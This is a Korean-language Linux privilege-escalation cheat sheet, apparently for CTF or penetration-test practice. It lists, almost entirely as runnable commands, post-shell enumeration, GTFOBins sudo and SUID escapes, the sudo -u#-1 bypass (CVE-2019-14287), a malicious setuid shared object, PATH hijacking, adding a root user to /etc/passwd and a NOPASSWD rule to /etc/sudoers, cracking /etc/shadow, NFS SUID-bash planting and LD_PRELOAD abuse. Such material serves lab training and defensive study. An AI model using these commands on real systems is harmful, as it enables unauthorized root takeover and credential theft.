## 0. 셸 잡은 직후 — 초기 열거 (제일 먼저)

```bash
id; whoami; sudo -l                     # 권한 4종
uname -a; cat /etc/os-release           # 커널/배포판
hostname; ip a; cat /etc/hosts
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID
getcap -r / 2>/dev/null                 # capabilities
cat /etc/crontab; ls -la /etc/cron.*    # 크론
ps aux | grep root                      # root 프로세스
netstat -tlnp 2>/dev/null; ss -tlnp     # 내부 서비스(로컬포트)
```

## 4. Linux Privesc — 수동 벡터 (하나씩)

### sudo -l → GTFOBins (제일 먼저·제일 흔함)

```bash
sudo -l
#허용된 바이너리를 gtfobins.github.io 에서 검색 (sudo 섹션)
sudo <binary> ...      # 예: sudo vim -c ':!/bin/sh' / sudo less → !/bin/sh / sudo awk 'BEGIN{system("/bin/sh")}'
#sudo 버전 취약점 (Baron Samedit)
sudo --version         # <1.9.5p2 → CVE-2021-3156
#sudo 설정 우회
#  sudo -l에 (ALL, !root) 보이면 → CVE-2019-14287:
sudo -u#-1 <allowed_binary>          # -u#-1 = root로 실행
#  env_keep에 LD_PRELOAD/LD_LIBRARY_PATH 있으면 → 아래 LD_PRELOAD 벡터
```

### SUID / SGID → GTFOBins

```bash
find / -perm -4000 -type f 2>/dev/null
#낯선 SUID → gtfobins (SUID 섹션). 예:
#/usr/bin/find . -exec /bin/sh -p \; -quit
#custom SUID → strings/ltrace로 내부 호출·라이브러리 확인
strings /path/suidbin | grep -i "system\|exec\|/bin"
ltrace /path/suidbin 2>&1 | grep -i "system\|open"
#절대경로 없이 명령 호출 → PATH 하이재킹 (아래)
#쓰기가능 경로의 .so 로드 → 공유객체 인젝션:
#  gcc -shared -fPIC -nostartfiles -o /writable/evil.so evil.c
#  (evil.c: void _init(){setuid(0);system("/bin/bash -p");})
```

### Capabilities

```bash
getcap -r / 2>/dev/null
#cap_setuid 있으면 → 예: python
./python -c 'import os;os.setuid(0);os.system("/bin/sh")'
#gtfobins의 Capabilities 섹션 참조 (perl, python, node 등)
```

### Cron Jobs (pspy로 발견)

```bash
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.daily
#root가 실행하는 스크립트가 쓰기 가능하면 → 내용 교체

#PATH 기반 크론 → PATH 하이재킹 (아래)
#와일드카드 크론 (tar/rsync) → 와일드카드 인젝션 (아래)
```

### PATH 하이재킹

```bash
#root 스크립트/SUID가 절대경로 없이 명령 호출 시
cd /tmp; echo '/bin/bash -p' > ls; chmod +x ls
export PATH=/tmp:$PATH; /path/vuln_program
```

### 쓰기/읽기 가능한 민감 파일

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers
#/etc/passwd 쓰기 가능 → root 유저 추가
openssl passwd -1 -salt x pass123        # 해시 생성 → $1$x$...
echo 'hacker:$1$x$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd; su hacker
#/etc/sudoers 쓰기 가능
echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
#/etc/shadow 읽기 가능 → root 해시 크랙
unshadow /etc/passwd /etc/shadow > un.txt
hashcat -m 1800 un.txt rockyou.txt       # $6$=sha512crypt(1800), $1$=md5crypt(500)
#/etc/shadow 쓰기 가능 → root 해시를 내가 아는 값으로 교체
```

### NFS no_root_squash

```bash
#Kali에서
showmount -e TARGET
mount -o rw TARGET:/share /mnt/nfs
#/mnt/nfs에 SUID 바이너리 심기 (root로 마운트돼 있으면)
cp /bin/bash /mnt/nfs/rootbash; chmod +s /mnt/nfs/rootbash
#타깃에서: /share/rootbash -p
```

### LD_PRELOAD / LD_LIBRARY_PATH (sudo env_keep)

```bash

sudo LD_PRELOAD=/tmp/x.so <allowed_command>
```

## 5. Foothold — 서비스별 (웹 외)

```bash

#SSH(22): 키 재사용 / 약한 비번 (찾은 크리덴셜)

smbclient -L //TARGET -N ; enum4linux-ng -A TARGET
#낯선 포트 → 배너 뽑고 그대로 검색 + searchsploit
nmap -sV -p <port> TARGET ; searchsploit <service> <version>
#서비스 버전 익스플로잇 (예: 4505/4506 ZMTP → SaltStack, Redis 6379 unauth 등)
```

## 7. 핵심 순서 & 팁

```
셸 → id/sudo -l/SUID/getcap 4종 → linpeas + pspy → GTFOBins 대조 → 크리덴셜 재사용
```

- **sudo -l** 과 **SUID**는 항상 GTFOBins에 대조
- **pspy** 는 cron 기반 privesc의 핵심 (숨은 root 작업 발견)
- 커널 익스플로잇은 최후수단 (박스 죽을 수 있음), **PwnKit/DirtyPipe** 만 우선
- 자동 스캐너가 놓친 게 있으면 → **크리덴셜 재사용**(찾은 비번을 su/ssh/DB에)
